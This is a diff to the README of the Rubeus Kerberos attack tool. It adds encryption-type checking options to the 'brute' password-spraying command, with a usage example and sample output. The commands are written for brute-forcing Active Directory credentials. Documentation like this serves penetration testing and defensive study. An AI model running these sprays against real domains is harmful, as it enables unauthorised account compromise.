@@ -125,7 +125,7 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
 
         Perform a Kerberos-based password bruteforcing attack:
-            Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
+            Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap] [/checkenctype & /validuser:username & /validpassword:password]
 
         Perform a scan for account that do not require pre-authentication:
             Rubeus.exe preauthscan /users:C:\temp\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:https://KDC_PROXY/kdcproxy]
@@ -1108,6 +1108,27 @@ The **brute** action will perform a Kerberos-based password bruteforcing or pass
     [*] base64(newuser.kirbi):
 
           doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...
+
+Using the `checkenctype`, `/validpassword` and `/validuser` arguments to check the Encrytion type before password spray.
+
+Rubeus.exe brute /password:xxx /noticket /domain:abc.def.com /checkenctype /validuser:xxx /validpassword:xxx
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+[*] Action: Perform Kerberos Brute Force
+
+[*] Using domain controller: abc.def.com
+[*] Trying encryption type: rc4_hmac
+
+
 
 ### preauthscan
 
